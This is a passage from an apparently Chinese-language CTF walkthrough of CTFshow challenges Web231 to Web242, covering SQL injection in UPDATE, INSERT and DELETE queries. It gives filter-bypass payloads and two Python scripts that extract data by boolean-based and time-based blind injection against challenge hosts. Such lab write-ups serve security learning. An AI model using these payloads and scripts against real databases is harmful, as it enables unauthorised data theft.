alt="image.png"><br>接下来一步步爆就可以，不赘述<br>也可以用子查询：<br><code>password=&#39;,username=(select a from (select group_concat(flagas)a from flaga) y4tacker) where 1=1;#&amp;username=1</code><br>那个a是给字段的别名</p>
<h2 id="Web232（同上）"><a href="#Web232（同上）" class="headerlink" title="Web232（同上）"></a>Web232（同上）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664435637884-0eb00687-ea97-4f3e-b997-d0ebf29f4163.png#averageHue=%23f7f7f7&clientId=u622cd15b-bea3-4&from=paste&height=353&id=u6db8ff08&name=image.png&originHeight=441&originWidth=1767&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13936&status=done&style=none&taskId=u957c131f-6e7b-49bb-aae8-d8cc5a40996&title=&width=1413.6" alt="image.png"><br>加了个md5我们闭合一下就好了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664435651499-c9b73181-50e3-457e-8fad-44cc5db6b129.png#averageHue=%23acacac&clientId=u622cd15b-bea3-4&from=paste&height=766&id=u31e4291f&name=image.png&originHeight=957&originWidth=1390&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57234&status=done&style=none&taskId=u1b67cb53-1dce-477c-b839-4cc3a63ece8&title=&width=1112" alt="image.png"><br>更新成功，查看：</p>
<ul>
<li>user（）：查看当前的用户</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664435660755-c121622b-19e7-4336-be9a-dbb661a3a9e7.png#averageHue=%23f8f8f7&clientId=u622cd15b-bea3-4&from=paste&height=454&id=u3f8ee010&name=image.png&originHeight=567&originWidth=1364&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54525&status=done&style=none&taskId=ub439c60e-57ff-497c-ac0c-c66228fe99f&title=&width=1091.2" alt="image.png"></p>
<p>接下来和上一题一样慢慢爆就好了</p>
<h2 id="Web233（boolean盲注）"><a href="#Web233（boolean盲注）" class="headerlink" title="Web233（boolean盲注）"></a>Web233（boolean盲注）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664437682571-66cbf810-e80c-4f2e-9614-a75e2b76b4df.png#averageHue=%23f5f4f4&clientId=u622cd15b-bea3-4&from=paste&height=230&id=ub3f68196&name=image.png&originHeight=288&originWidth=1202&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7943&status=done&style=none&taskId=ue8aa8add-42a9-4588-beb2-5bfc440bbad&title=&width=961.6" alt="image.png"><br>查询语句没有变动，他也说没过滤，但是用上一题的payload不行了，肯定是过滤了，这边就用布尔盲注了<br>，猜测是对password中的内容进行了过滤<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664437716253-ac9f8722-defa-4ec4-8b92-f96f9e60cdf1.png#averageHue=%238d8d8d&clientId=u622cd15b-bea3-4&from=paste&height=535&id=u9c257d88&name=image.png&originHeight=669&originWidth=1210&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50343&status=done&style=none&taskId=ud1cd5068-59ab-4919-b9aa-88a69ed363e&title=&width=968" alt="image.png"><br>这边显示更新成功了，ctfshow是我们之前知道的一个用户名<br>然后就是写脚本跑脚本了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://0f2a5b6f-77cb-45ff-b1a9-af71f316cfbd.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head=<span class="number">1</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        j+=<span class="number">1</span></span><br><span class="line">        mid=(head+tail)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="comment"># payload=f&quot;ctfshow&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;</span></span><br><span class="line">        <span class="comment">#banlist,ctfshow_user,flag233333,查询表名</span></span><br><span class="line">        <span class="comment"># payload=f&quot;ctfshow&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag233333&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;</span></span><br><span class="line">        <span class="comment">#查询字段id,flagass233,info</span></span><br><span class="line">        payload=<span class="string">f&quot;ctfshow&#x27; and if(ascii(substr((select group_concat(id,flagass233,info) from flag233333),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)#&quot;</span></span><br><span class="line">        <span class="comment">#答案</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:j</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u66f4\\u65b0\\u6210\\u529f&quot;</span> <span class="keyword">in</span> r.text:<span class="comment">#更新成功</span></span><br><span class="line">            head=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail=mid</span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(head)</span><br><span class="line">        flag+=<span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>


<h2 id="Web234（-转义"><a href="#Web234（-转义" class="headerlink" title="Web234（\转义)"></a>Web234（\转义)</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664440464804-17be5d16-ded4-41a0-b617-c81987e3c23b.png#averageHue=%23f4f4f4&clientId=u622cd15b-bea3-4&from=paste&height=136&id=ud4edf0bb&name=image.png&originHeight=170&originWidth=953&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5785&status=done&style=none&taskId=ueacfbd11-7c80-471d-83ca-bda1e9378bc&title=&width=762.4" alt="image.png"><br>这一题经过了一系列的fuzz，发现username中ban掉了单引号，因此这一题可以用一个很骚的方法，这方法在上面几题中应该也是通用的<br>我们payload：<br><code>password=2\&amp;username=,username=2#</code><br>这样查询语句就变成了<code>update ctfshow_user set pass = &#39;\&#39; where username =,username=2#&#39;</code><br>反斜杠转义了单引号，导致password&#x3D;<code>&#39; where username =</code><br>然后username跟着传参<code>,username=2#&#39;</code>,最终效果为：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664440569614-6200c868-6b5d-47f3-9b57-772bc45fc5e7.png#averageHue=%23faf9f9&clientId=u622cd15b-bea3-4&from=paste&height=158&id=uf67cd90b&name=image.png&originHeight=198&originWidth=973&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13495&status=done&style=none&taskId=ub06d5e3a-07d2-4464-a176-17d869a4ce6&title=&width=778.4" alt="image.png"><br>接下来就和web231一样去爆库<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664440630890-d2a3c99a-a6f5-4673-bcb5-073ca6bb6b65.png#averageHue=%232c2c2c&clientId=u622cd15b-bea3-4&from=paste&height=63&id=u13af2ac8&name=image.png&originHeight=79&originWidth=757&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13901&status=done&style=none&taskId=u8ef96179-b726-4558-b095-2cd8d1b9ddc&title=&width=605.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664440622840-00dd9d53-38e8-4216-a75a-f6bbbdc0cab6.png#averageHue=%23f3f2f2&clientId=u622cd15b-bea3-4&from=paste&height=100&id=u3ec27468&name=image.png&originHeight=125&originWidth=480&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10351&status=done&style=none&taskId=u1a19434d-6981-4a3a-8dda-b0e2111510c&title=&width=384" alt="image.png"><br>接下来爆字段名，有个问题就是<code>where table_name=&#39;&#39;</code><br>这里会用到单引号，我们不要慌，用十六进制去绕过即可：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664440740005-1e34d263-ef2e-4fe3-8a55-45121e5a0887.png#averageHue=%23242424&clientId=u622cd15b-bea3-4&from=paste&height=114&id=ude80f1c5&name=image.png&originHeight=143&originWidth=856&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19332&status=done&style=none&taskId=u26d4d2bf-c686-45eb-903c-a9de5c8123a&title=&width=684.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664440743967-552c7728-cda6-4f2b-a0f9-8ede9f03b50e.png#averageHue=%23f9f8f8&clientId=u622cd15b-bea3-4&from=paste&height=87&id=u10f4ae9a&name=image.png&originHeight=109&originWidth=429&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7621&status=done&style=none&taskId=u69b0c517-2243-4d6e-97ff-86e776799d3&title=&width=343.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664440841359-b3135b91-b674-46ec-a52b-45d2bfd6ce7b.png#averageHue=%23222222&clientId=u622cd15b-bea3-4&from=paste&height=76&id=u21f6dc84&name=image.png&originHeight=95&originWidth=806&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12086&status=done&style=none&taskId=ud34ce826-d3c0-4d21-bfd5-73ddc7e172e&title=&width=644.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664440845382-c5fd2f89-74fc-4edf-8c09-4d80bed00231.png#averageHue=%23f6f5f4&clientId=u622cd15b-bea3-4&from=paste&height=101&id=uc30e5f47&name=image.png&originHeight=126&originWidth=836&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23197&status=done&style=none&taskId=u6be70e88-86a5-4571-b262-63ccde1ad26&title=&width=668.8" alt="image.png"></p>
<h2 id="Web235（information库过滤-子查询）"><a href="#Web235（information库过滤-子查询）" class="headerlink" title="Web235（information库过滤+子查询）"></a>Web235（information库过滤+子查询）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664443190780-36725fd0-828b-47dc-bee5-9feab84d73a8.png#averageHue=%23f5f5f5&clientId=u622cd15b-bea3-4&from=paste&height=274&id=u39157023&name=image.png&originHeight=342&originWidth=1480&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9365&status=done&style=none&taskId=u834ba588-7133-4975-984e-d5be66b6df4&title=&width=1184" alt="image.png"><br>题目说了过滤单引号和or，那information库就用不了了，mysql中不是只有information库有表格的信息，还有其他很多库，如mysql.innodb_table_stats<br>参考文章：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664443325657-8d8fedda-1817-4186-8a0a-621ac72c5d6a.png#averageHue=%23f7f0c5&clientId=u622cd15b-bea3-4&from=paste&height=714&id=u25d19a92&name=image.png&originHeight=892&originWidth=1060&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77679&status=done&style=none&taskId=ue038444d-2ce8-47d3-8dda-258b08043a6&title=&width=848" alt="image.png"></p>
<p>首先反斜杠还是可以让参数溢出的，password仍然是反斜杠，只需要改一些information库即可，所以payload：<br><code>password=2\&amp;username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664443313922-2fd73022-7877-4433-ad09-6af359c89aef.png#averageHue=%23f9f8f7&clientId=u622cd15b-bea3-4&from=paste&height=131&id=u8167a870&name=image.png&originHeight=164&originWidth=874&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21643&status=done&style=none&taskId=u1421c710-66aa-49d8-8e6e-9f0d69b36c1&title=&width=699.2" alt="image.png"><br>表名已经知道了，剩下的就是字段了，这里可以用子查询去爆字段</p>
<ul>
<li>子查询：</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664443729680-87f8d853-8c74-42bd-a1f1-428e3f4661e8.png#averageHue=%23181512&clientId=u622cd15b-bea3-4&from=paste&height=47&id=u73492612&name=image.png&originHeight=59&originWidth=720&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9229&status=done&style=none&taskId=u1420bf8f-3fd4-4df7-a7ad-52c8c434cbc&title=&width=576" alt="image.png"><br>格式大概如上，这个报错的意思是每个派生表都要有他的别名，也就是标准格式是：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664443752029-3fbd23d0-3b93-4b49-97ca-6615134d4138.png#averageHue=%230d0d0c&clientId=u622cd15b-bea3-4&from=paste&height=172&id=ud6c01ad6&name=image.png&originHeight=215&originWidth=875&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7784&status=done&style=none&taskId=u77db0eea-4f04-4e7f-b988-2147c2e2e61&title=&width=700" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664443773790-a6124449-112c-4fd3-8068-7221cf01a162.png#averageHue=%230e0d0d&clientId=u622cd15b-bea3-4&from=paste&height=178&id=u47278d01&name=image.png&originHeight=223&originWidth=945&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9160&status=done&style=none&taskId=u3bed9e2f-b740-468c-9ff8-11ea234a2fa&title=&width=756" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664443873643-ef050dfd-0644-4088-a796-33b59803a613.png#averageHue=%230d0d0d&clientId=u622cd15b-bea3-4&from=paste&height=182&id=u6ea85c79&name=image.png&originHeight=228&originWidth=847&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8054&status=done&style=none&taskId=uded7b560-cb8a-4f82-b2e6-7dab4501e6a&title=&width=677.6" alt="image.png"></p>
<p>讲完子查询，接下来就payload，表是<code>flag23a1</code>：<br><code>password=\&amp;username=,username=(select group_concat(c) from (select 1,2 as c,3 union select * from flag23a1) d)#</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664444449127-fd58a317-fef8-4add-9148-37a74a0df119.png#averageHue=%23f9f8f6&clientId=u622cd15b-bea3-4&from=paste&height=471&id=u213aa873&name=image.png&originHeight=589&originWidth=690&originalType=binary&ratio=1&rotation=0&showTitle=false&size=106932&status=done&style=none&taskId=ue80ed040-ad86-46d9-af5c-88cedef5e89&title=&width=552" alt="image.png"><br><code>(select group_concat(c) from (select 1,2 as c,3 union select * from flag23a1) d)</code>返回的数据有2行，所以要用group by</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())-- - &amp;password=\</span></span><br><span class="line"><span class="comment"># username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)-- - &amp;password=\</span></span><br><span class="line">或者一样的没区别只是如果没过率数字可以这样玩</span><br><span class="line"><span class="comment"># username=,username=(select `2` from(select 1,2,3 union select * from flag23a1 limit 1,1)a)-- - &amp;password=\</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Web236（同上）"><a href="#Web236（同上）" class="headerlink" title="Web236（同上）"></a>Web236（同上）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664445421753-7b16b63f-ae48-43a8-af4b-9f407cc34413.png#averageHue=%23f5f5f5&clientId=u622cd15b-bea3-4&from=paste&height=232&id=u98e43c3a&name=image.png&originHeight=290&originWidth=1260&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8285&status=done&style=none&taskId=u89936595-b2f4-401c-9667-967567617c2&title=&width=1008" alt="image.png"><br>嘴巴上说是说ban了flag，可以是还是可以像上一题一样做出来</p>
<h2 id="Web237（insert注入开始）"><a href="#Web237（insert注入开始）" class="headerlink" title="Web237（insert注入开始）"></a>Web237（insert注入开始）</h2><p>语句如下<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664465741156-8447739a-0f89-415d-bce5-cc1cdf81b3cf.png#averageHue=%23f6f6f6&clientId=ue64b6226-c23d-4&from=paste&height=458&id=ue23899f1&name=image.png&originHeight=572&originWidth=1596&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18885&status=done&style=none&taskId=ub6de4369-93ab-4c5d-9444-043dae7b283&title=&width=1276.8" alt="image.png"><br>这边和update其实是一个意思，在添加数据的时候给脏字符<br>payload：<br><code>username=kino&#39;,database())#</code>,<code>password=1</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664465813838-a1a33507-5504-4bfd-b5e0-85ffbb59476e.png#averageHue=%23fdfdfd&clientId=ue64b6226-c23d-4&from=paste&height=38&id=ue5eec023&name=image.png&originHeight=47&originWidth=1075&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3531&status=done&style=none&taskId=ud33fc536-07dc-4a49-8dd6-4da1e67140b&title=&width=860" alt="image.png"><br>然后<code>username=kino&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))#</code>,<code>password=1</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664465856500-1729dcb4-664e-4136-9878-f07377c5d0ec.png#averageHue=%23fcfcfc&clientId=ue64b6226-c23d-4&from=paste&height=266&id=u1aeadda6&name=image.png&originHeight=333&originWidth=1677&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36067&status=done&style=none&taskId=u24d38165-a2b1-44a7-99da-a826f6454b2&title=&width=1341.6" alt="image.png"><br>最后效果如上，一步步的去爆</p>
<p>payload2:这里也可以和上面用反斜杠\去转义来做</p>
<h2 id="Web238（过滤空格）"><a href="#Web238（过滤空格）" class="headerlink" title="Web238（过滤空格）"></a>Web238（过滤空格）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664466720592-ba2afcd7-ab6d-4c3d-bd36-c76c4f0df262.png#averageHue=%23f6f6f6&clientId=ue64b6226-c23d-4&from=paste&height=313&id=ud3fbba9f&name=image.png&originHeight=391&originWidth=1445&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10938&status=done&style=none&taskId=u7c944efe-ac73-46c3-9768-3bfa90245f4&title=&width=1156" alt="image.png"><br>ban掉了空格，那我们只需要把上面的payload修改一下，换成反引号或者括号即可<br><code>username=kino&#39;,(select(group_concat(table_name))from(information_schema.tables)where</code>table_schema<code>=database()))#</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664466928326-53123a96-a04b-4bc3-a7e9-de7269e2ba7f.png#averageHue=%23f4f3f3&clientId=ue64b6226-c23d-4&from=paste&height=56&id=uad185b39&name=image.png&originHeight=70&originWidth=1127&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5422&status=done&style=none&taskId=u353e2d59-402b-417d-a224-bc99fede7e4&title=&width=901.6" alt="image.png"><br>接下来就不赘述</p>
<p>payload2:这里也可以和上面用反斜杠\去转义来做</p>
<h2 id="Web239-过滤空格，or）"><a href="#Web239-过滤空格，or）" class="headerlink" title="Web239(过滤空格，or）"></a>Web239(过滤空格，or）</h2><p>注意这里他妈的过滤空格的意思是所有绕过空格的写法也没了，也就是还ban了*号<br>这边不能用information表了用mysql里的，和上面235一样</p>
<p>然后payload:<br>username&#x3D;<code>1&#39;(select(flag)from(flagbb)))#</code><br>password&#x3D;1<br>这个flag列名是猜的<br>payload2：<br>username&#x3D;<br>password&#x3D;<code>,(select(flag)from(flagbb)))#</code></p>
<h2 id="Web240（insert结束）"><a href="#Web240（insert结束）" class="headerlink" title="Web240（insert结束）"></a>Web240（insert结束）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664517649479-051baf01-ef63-4146-86d0-39aa624f8641.png#averageHue=%23fefefe&clientId=u01553bf6-521b-4&from=paste&height=80&id=ub3d6e441&name=image.png&originHeight=100&originWidth=748&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7810&status=done&style=none&taskId=u544d6bd9-fe41-49a4-8a0d-78d56dbada3&title=&width=598.4" alt="image.png">	<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664517657184-a92694f2-97c2-4875-a980-244069fc5e41.png#averageHue=%23f6f6f6&clientId=u01553bf6-521b-4&from=paste&height=285&id=u237d9d7e&name=image.png&originHeight=356&originWidth=1226&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10654&status=done&style=none&taskId=u2afb69d0-1bf7-42aa-8987-da6e05a33e8&title=&width=980.8" alt="image.png"><br>查询语法没变，只是mysql库也被ban了，但是hint中提示我们表名是flagxxxxx，然后根据前面的规律可以知道列名是flag，这样我们直接抓包爆破即可：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664517697956-96cc1cdf-01cc-4df7-987d-212c50ca17bc.png#averageHue=%23f8f8f8&clientId=u01553bf6-521b-4&from=paste&height=335&id=uf1d6af3a&name=image.png&originHeight=419&originWidth=1278&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50330&status=done&style=none&taskId=udaa4b43a-9649-49f6-b008-f69cc959ff0&title=&width=1022.4" alt="image.png"><br>选取flag后面的五位为爆破点：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664517715681-151da01f-6f48-41e4-b3de-4e9ea4e9c479.png#averageHue=%23faf9f9&clientId=u01553bf6-521b-4&from=paste&height=84&id=ua950f7d1&name=image.png&originHeight=105&originWidth=620&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7139&status=done&style=none&taskId=u0063f49d-b66d-4cc8-a46f-f11dd9f2cbd&title=&width=496" alt="image.png">.<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664517718858-03d0f1e5-4ff8-4b78-a60c-e359b728f21d.png#averageHue=%23f8f7f7&clientId=u01553bf6-521b-4&from=paste&height=273&id=uf96ff714&name=image.png&originHeight=341&originWidth=834&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24677&status=done&style=none&taskId=u6fe47be4-9051-44d8-821b-a6b39591bf3&title=&width=667.2" alt="image.png"><br>之后页面给的msg全都是插入成功，但是只有正确的表名会显示数据，我们刷新页面就出来答案了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664517746206-d709f398-5869-4775-9c32-d660686de320.png#averageHue=%23fcfcfc&clientId=u01553bf6-521b-4&from=paste&height=182&id=u9b0d4b62&name=image.png&originHeight=227&originWidth=1686&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16018&status=done&style=none&taskId=u9e3f87e3-6c6b-4ae0-a4c1-089b11f50ca&title=&width=1348.8" alt="image.png"></p>
<h2 id="Web241（delete开始）"><a href="#Web241（delete开始）" class="headerlink" title="Web241（delete开始）"></a>Web241（delete开始）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664518640720-516386a3-42ef-403e-b4a6-bdff2debbb6b.png#averageHue=%23f7f7f6&clientId=u01553bf6-521b-4&from=paste&height=278&id=u64856262&name=image.png&originHeight=348&originWidth=1681&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9140&status=done&style=none&taskId=u159caf6d-0431-481a-87dd-dbfb5792989&title=&width=1344.8" alt="image.png"><br>抓包分析：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664518646744-046a0e6a-2f2e-4eea-a684-cdb345a7ff06.png#averageHue=%23f6f6f5&clientId=u01553bf6-521b-4&from=paste&height=231&id=u4568b0cf&name=image.png&originHeight=289&originWidth=1318&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42729&status=done&style=none&taskId=uf63bf0f6-9026-4ebc-919b-eadc82274fb&title=&width=1054.4" alt="image.png"><br>发现这样可以成功延时，那就说明这里存在时间盲注了，那废话不多说就直接开始写脚本了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&#x27;http://c6e1e9e4-f2b5-4ca2-955e-ddfc840bea31.challenge.ctf.show/api/delete.php&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head=<span class="number">1</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid=(head+tail)&gt;&gt;<span class="number">1</span></span><br><span class="line">        payload=&#123;</span><br><span class="line">           <span class="comment"># &quot;id&quot;:f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.05),1)&quot;</span></span><br><span class="line">            <span class="comment">#banlist,ctfshow_user,flag</span></span><br><span class="line">        <span class="comment"># &quot;id&quot;:f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.05),1)&quot;</span></span><br><span class="line">        <span class="comment">#id,flag,info</span></span><br><span class="line">        <span class="string">&quot;id&quot;</span>:<span class="string">f&quot;if(ascii(substr((select group_concat(id,flag,info) from flag),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.05),1)&quot;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        t1=time.time()</span><br><span class="line">        r=requests.post(url,data=payload)</span><br><span class="line">        t2=time.time()</span><br><span class="line">        <span class="comment"># print(t2-t1)#调试</span></span><br><span class="line">        <span class="keyword">if</span> t2-t1&gt;<span class="number">0.5</span>:</span><br><span class="line">            head=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail=mid</span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">1</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="Web242-file注入开始）"><a href="#Web242-file注入开始）" class="headerlink" title="Web242(file注入开始）"></a>Web242(file注入开始）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664522290188-f02c72a7-dfa7-4412-8251-35060c9c34b5.png#averageHue=%23f7f7f7&clientId=u01553bf6-521b-4&from=paste&height=314&id=uc896d40a&name=image.png&originHeight=393&originWidth=1620&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10702&status=done&style=none&taskId=udbff960a-00c2-490b-ae5a-08d268d9aad&title=&width=1296" alt="image.png"><br>这是导出数据的语句，参考：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664522305687-b58d221a-8247-498b-8474-3ced642923b5.png#averageHue=%23faf9f8&clientId=u01553bf6-521b-4&from=paste&height=432&id=u3b984b1d&name=image.png&originHeight=540&originWidth=896&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59701&status=done&style=none&taskId=ufbd6da91-3765-4801-9cfe-c9af7bdf0ff&title=&width=716.8" alt="image.png"><br>starting by每行开始<br>terminated by是每行结束<br>这边我在本地试了一下各参数是什么意思：<br><code>LINES TERMINATED BY</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664522331744-e3c3bf95-9d5b-48ec-9903-ce63eff0de88.png#averageHue=%23d4e6c3&clientId=u01553bf6-521b-4&from=paste&height=88&id=u9f4f246a&name=image.png&originHeight=110&originWidth=926&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24064&status=done&style=none&taskId=uafaff043-3337-4342-b320-f154381ba04&title=&width=740.8" alt="image.png"><br><img 